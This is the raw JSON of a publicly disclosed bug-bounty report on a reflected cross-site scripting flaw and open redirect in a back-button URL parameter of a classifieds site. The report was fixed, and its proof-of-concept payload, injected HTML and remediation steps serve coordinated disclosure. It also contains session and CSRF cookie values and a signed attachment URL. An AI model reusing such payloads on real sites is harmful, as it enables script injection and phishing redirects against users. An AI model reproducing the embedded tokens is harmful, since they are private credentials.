{"id":177619,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzc2MTk=","url":"https://hackerone.com/reports/177619","title":"Reflective XSS at dubai.dubizzle.com","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2016-10-23T08:09:01.014Z","submitted_at":"2016-10-23T08:09:01.014Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"hogarth45","url":"/hogarth45","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/LyKmffY4ogeLKvym8z7NB8vw/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8146,"url":"https://hackerone.com/olx","handle":"olx","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/146/07ffc7e779ee301e61da60eda7f2bd862a7082ca_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/146/07ffc7e779ee301e61da60eda7f2bd862a7082ca_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"OLX","twitter_handle":"OLX","website":"http://olx.com","about":"OLX is an online classifieds platform that enables its users to create ads and display them on social networks."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-03-03T09:44:17.146Z","bug_reporter_agreed_on_going_public_at":"2017-02-27T14:35:49.185Z","team_member_agreed_on_going_public_at":"2017-03-03T09:44:17.103Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"POC\n===\n1) Visit:\nhttps://dubai.dubizzle.com/m/motors/used-cars/toyota/supra/2016/10/16/toyota-supra-original-left-hand-drive-duba-2-2/?back=amF2YXNjcmlwdDovLyUwQWFsZXJ0KGRvY3VtZW50LmRvbWFpbik=\u0026from_search\u0026highlighted_ads=1\n2) Click on \"Back\" button in upper left hand corner\n\nAttack\n====\n**URL Parameters**\nback=amF2YXNjcmlwdDovLyUwQWFsZXJ0KGRvY3VtZW50LmRvbWFpbik=\nfrom_search\nhighlighted_ads=1\n\nThe vulnerable url parameter is ```back``` \nNormally its contents is the base64 encoding of the referrer URL.\nIt is also possible to inject javascript.\n\nAttack string is a base64 encoding of this payload\n```\njavascript://%0Aalert(document.domain)\n```\n\nInjection happens at line 480\n```\n\u003cdiv id=\"header-left\"\u003e\u003ca id=\"back\" class=\"button grey\" href=\"javascript://%0Aalert(document.domain)/m\"\u003eBack\u003c/a\u003e\u003c/div\u003e\n```\n\nResolution\n=======\n1) Remove use of url parameter for site navigation\n2) Remove \"amF2YXNjcmlwdA\" (javascript) as acceptable in variable value\n3) Remove colon\n\nEtc\n=====\n\nAlso possible to do open redirects (Note the domain change):\nhttps://dubai.dubizzle.com/m/motors/used-cars/toyota/supra/2016/10/16/toyota-supra-original-left-hand-drive-duba-2-2/?back=aHR0cDovL2JsYWNrZG9vcnNlYy5uZXQ=\u0026from_search\u0026highlighted_ads=1\n\nIP during testing\n68.69.254.107\n\n**Request Headers**\n```\nGET /m/motors/used-cars/toyota/supra/2016/10/16/toyota-supra-original-left-hand-drive-duba-2-2/?back=amF2YXNjcmlwdDovLyUwQWFsZXJ0KGRvY3VtZW50LmRvbWFpbik=\u0026from_search\u0026highlighted_ads=1 HTTP/1.1\nHost: dubai.dubizzle.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nCookie: xtvrn=$509193$509856$; sid=yywt3todar28z1mz18092j353iyw97lc; default_site=2; csrftoken=beN0Jhf16oIKUrKg0YMoaja0hvMVmqYM; xtor=cs5-18006%5Bblog%5D-%5Bproperty%5D-%5Bq2_dubai_info%5D-%5Ben%5D-%5B09%252F08%252F2016%5D; xtdate=Fri%20Oct%2021%202016%2001%3A37%3A34%20GMT-0500%20%28Central%20Standard%20Time%29; xtide=%5B%5D; l=9239739; skybar_sess_True=4; skybar_preference_True=hide\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\n```\n\nI request that this ticket for public disclosure once it is fixed.","vulnerability_information_html":"\u003ch1 id=\"poc\"\u003ePOC\u003c/h1\u003e\n\n\u003cp\u003e1) Visit:\u003cbr\u003e\n\u003ca title=\"https://dubai.dubizzle.com/m/motors/used-cars/toyota/supra/2016/10/16/toyota-supra-original-left-hand-drive-duba-2-2/?back=amF2YXNjcmlwdDovLyUwQWFsZXJ0KGRvY3VtZW50LmRvbWFpbik=\u0026amp;from_search\u0026amp;highlighted_ads=1\" href=\"/redirect?url=https%3A%2F%2Fdubai.dubizzle.com%2Fm%2Fmotors%2Fused-cars%2Ftoyota%2Fsupra%2F2016%2F10%2F16%2Ftoyota-supra-original-left-hand-drive-duba-2-2%2F%3Fback%3DamF2YXNjcmlwdDovLyUwQWFsZXJ0KGRvY3VtZW50LmRvbWFpbik%3D%26from_search%26highlighted_ads%3D1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://dubai.dubizzle.com/m/motors/used-cars/toyota/supra/2016/10/16/toyota-supra-original-left-hand-drive-duba-2-2/?back=amF2YXNjcmlwdDovLyUwQWFsZXJ0KGRvY3VtZW50LmRvbWFpbik=\u0026amp;from_search\u0026amp;highlighted_ads=1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n2) Click on \u0026quot;Back\u0026quot; button in upper left hand corner\u003c/p\u003e\n\n\u003ch1 id=\"attack\"\u003eAttack\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003eURL Parameters\u003c/strong\u003e\u003cbr\u003e\nback=amF2YXNjcmlwdDovLyUwQWFsZXJ0KGRvY3VtZW50LmRvbWFpbik=\u003cbr\u003e\nfrom_search\u003cbr\u003e\nhighlighted_ads=1\u003c/p\u003e\n\n\u003cp\u003eThe vulnerable url parameter is \u003ccode\u003eback\u003c/code\u003e \u003cbr\u003e\nNormally its contents is the base64 encoding of the referrer URL.\u003cbr\u003e\nIt is also possible to inject javascript.\u003c/p\u003e\n\n\u003cp\u003eAttack string is a base64 encoding of this payload\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ejavascript://%0Aalert(document.domain)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eInjection happens at line 480\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;div id=\u0026quot;header-left\u0026quot;\u0026gt;\u0026lt;a id=\u0026quot;back\u0026quot; class=\u0026quot;button grey\u0026quot; href=\u0026quot;javascript://%0Aalert(document.domain)/m\u0026quot;\u0026gt;Back\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"resolution\"\u003eResolution\u003c/h1\u003e\n\n\u003cp\u003e1) Remove use of url parameter for site navigation\u003cbr\u003e\n2) Remove \u0026quot;amF2YXNjcmlwdA\u0026quot; (javascript) as acceptable in variable value\u003cbr\u003e\n3) Remove colon\u003c/p\u003e\n\n\u003ch1 id=\"etc\"\u003eEtc\u003c/h1\u003e\n\n\u003cp\u003eAlso possible to do open redirects (Note the domain change):\u003cbr\u003e\n\u003ca title=\"https://dubai.dubizzle.com/m/motors/used-cars/toyota/supra/2016/10/16/toyota-supra-original-left-hand-drive-duba-2-2/?back=aHR0cDovL2JsYWNrZG9vcnNlYy5uZXQ=\u0026amp;from_search\u0026amp;highlighted_ads=1\" href=\"/redirect?url=https%3A%2F%2Fdubai.dubizzle.com%2Fm%2Fmotors%2Fused-cars%2Ftoyota%2Fsupra%2F2016%2F10%2F16%2Ftoyota-supra-original-left-hand-drive-duba-2-2%2F%3Fback%3DaHR0cDovL2JsYWNrZG9vcnNlYy5uZXQ%3D%26from_search%26highlighted_ads%3D1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://dubai.dubizzle.com/m/motors/used-cars/toyota/supra/2016/10/16/toyota-supra-original-left-hand-drive-duba-2-2/?back=aHR0cDovL2JsYWNrZG9vcnNlYy5uZXQ=\u0026amp;from_search\u0026amp;highlighted_ads=1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIP during testing\u003cbr\u003e\n68.69.254.107\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eRequest Headers\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /m/motors/used-cars/toyota/supra/2016/10/16/toyota-supra-original-left-hand-drive-duba-2-2/?back=amF2YXNjcmlwdDovLyUwQWFsZXJ0KGRvY3VtZW50LmRvbWFpbik=\u0026amp;from_search\u0026amp;highlighted_ads=1 HTTP/1.1\nHost: dubai.dubizzle.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nCookie: xtvrn=$509193$509856$; sid=yywt3todar28z1mz18092j353iyw97lc; default_site=2; csrftoken=beN0Jhf16oIKUrKg0YMoaja0hvMVmqYM; xtor=cs5-18006%5Bblog%5D-%5Bproperty%5D-%5Bq2_dubai_info%5D-%5Ben%5D-%5B09%252F08%252F2016%5D; xtdate=Fri%20Oct%2021%202016%2001%3A37%3A34%20GMT-0500%20%28Central%20Standard%20Time%29; xtide=%5B%5D; l=9239739; skybar_sess_True=4; skybar_preference_True=hide\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI request that this ticket for public disclosure once it is fixed.\u003c/p\u003e\n","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":129731,"file_name":"olx2.JPG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/129/731/1626069d4996f6580c54611be602ccfd72583d3e/olx2.JPG?response-content-disposition=attachment%3B%20filename%3D%22olx2.JPG%22%3B%20filename%2A%3DUTF-8%27%27olx2.JPG\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYMVJENU6%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044346Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDWBybDR3vqhcsLBSMk4%2B6P70Ud7eobaXGJmgB%2FHdxqCQIhANWsU51SqowXMmzbNIfK2pdim%2BgV3mQKWL%2FoNTr7y%2BXnKrQDCFEQARoMMDEzNjE5Mjc0ODQ5IgwVkuDdHKaHnFcy6foqkQMHSD9Lwk3G5nXNsgTE1I8L%2FxERDRm3%2FwUHGtqbcqWj8jHUHsiWc0cuMBCUgqjP7pOrgAWXPwSKRqGfafgzzyUteQgmLfDIZpwZZO81EZGgAEdp5E%2F2tBncLnh8ZJrCx1P8EmxR6%2Fo8vkF%2FuWOPJHhHJ2lZyEsbjRzNcQVb%2Fs7CNO5bq2zKtHPwg3C2%2Fo93S9si0IG2AHXGWlnAyij4fRQj6uwJQDGyJlOTWttICHGK4AhYMsL%2Fq0aTm792kd%2BkVeyySD0SgMka0Wq%2FLYnfvzpnIr6zq4ci4bh16b3oqaEB2qu%2B8Py2%2FrJqPIWmi9Gr4RYZH66IXOCLUFGFoL7%2FsdCJDHTy96SorDYSjRUAX6AnBb2%2BuQCKobl6A8PqHt6GIkexPyANWYD9UBBSoObzADm0EHpYf92QwrH85lDqfrE2608E%2BimFNYNs837N%2B%2BJ5e%2FLjI8CS4T%2BlvtfQ7gpk51s4g%2BuSdgjxrq11GhXx2Zm9KTkYc%2BazRqrSv12NTkj%2BiVjkzdX6KN6BUov3zndl%2F%2FWJHTC26qn%2FBTrqAa4l0p0G3kOLPeJ6QAhfVAW73vQA4dhMb6NjYVGNoVZWymk4%2BnyrxPSLgH6TjoldACc7Frzg8xwKr8bfp2yW0NADmrnAq%2BU8nVey7H%2FI%2FoXUWj%2FymOC1jAi02%2BBYJGMUz6qpIzeqj9m8H%2Bl96OuDejTKuHxueDmtYdH2wZFcrPixAjJ8zlSb7j2DKlSQCR%2BUjkw0%2Bi1e818DdrHBp%2BPRvDG%2FpIyFaeXaRuomWdaFOSF70HxUwxdFHg7GvBA2pEDNV34SrACAjARy0ifYBTStiJzmvr8mPk%2FH%2FXLhlmkIY1Hw7L%2FyR4lry8ZFSA%3D%3D\u0026X-Amz-Signature=7ae8855e734b6a00fe99a620a2c43dc859bfa1d6ff7a1695c64bebe7c0638d7c","file_size":61103,"type":"image/jpeg"}],"allow_singular_disclosure_at":"2017-03-29T14:35:49.225Z","allow_singular_disclosure_after":-118418877.53180005,"singular_disclosure_allowed":true,"vote_count":2,"voters":["eveeez","spetr0x"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1263749,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi,\n\nWe are deeply grateful for the security issue you shared with us. OLX's staff will we working on this issue to solve it.\n\nWe would like to add you in our Security Hall of Fame site that is hosted in security.olx.com. Could you please provide a profile you would like to link to (social media, HackerOne, etc) in our Hall of Fame entry?\n\nBest regards,\nGlobal Security Infrastructure Team","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eWe are deeply grateful for the security issue you shared with us. OLX\u0026#39;s staff will we working on this issue to solve it.\u003c/p\u003e\n\n\u003cp\u003eWe would like to add you in our Security Hall of Fame site that is hosted in security.olx.com. Could you please provide a profile you would like to link to (social media, HackerOne, etc) in our Hall of Fame entry?\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGlobal Security Infrastructure Team\u003c/p\u003e\n","automated_response":false,"created_at":"2016-10-24T07:17:37.925Z","updated_at":"2016-10-24T07:17:37.925Z","actor":{"username":"joaquin_rinaudo","cleared":false,"url":"/joaquin_rinaudo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/082/536/d33cf1cd7294a47bece9ee43f87d518c7f9872d0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1384216,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-23T22:18:42.651Z","updated_at":"2016-12-23T22:18:42.651Z","additional_data":{"duplicate_report_id":179519},"actor":{"username":"alyanwarr","cleared":false,"url":"/alyanwarr","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1507693,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"The issue has already been fixed.\n\nThanks again for the report.\n\nBest regards,\nJoaquín ","markdown_message":"\u003cp\u003eThe issue has already been fixed.\u003c/p\u003e\n\n\u003cp\u003eThanks again for the report.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJoaquín \u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-27T08:45:48.164Z","updated_at":"2017-02-27T08:45:48.164Z","actor":{"username":"joaquin_rinaudo","cleared":false,"url":"/joaquin_rinaudo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/082/536/d33cf1cd7294a47bece9ee43f87d518c7f9872d0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"hogarth45","url":"/hogarth45"},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1508438,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-27T14:35:49.206Z","updated_at":"2017-02-27T14:35:49.206Z","first_to_agree":true,"actor":{"username":"hogarth45","cleared":true,"url":"/hogarth45","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/LyKmffY4ogeLKvym8z7NB8vw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1517087,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-03T09:44:17.124Z","updated_at":"2017-03-03T09:44:17.124Z","actor":{"username":"joaquin_rinaudo","cleared":false,"url":"/joaquin_rinaudo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/082/536/d33cf1cd7294a47bece9ee43f87d518c7f9872d0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1517088,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-03T09:44:17.164Z","updated_at":"2017-03-03T09:44:17.164Z","actor":{"username":"joaquin_rinaudo","cleared":false,"url":"/joaquin_rinaudo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/082/536/d33cf1cd7294a47bece9ee43f87d518c7f9872d0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}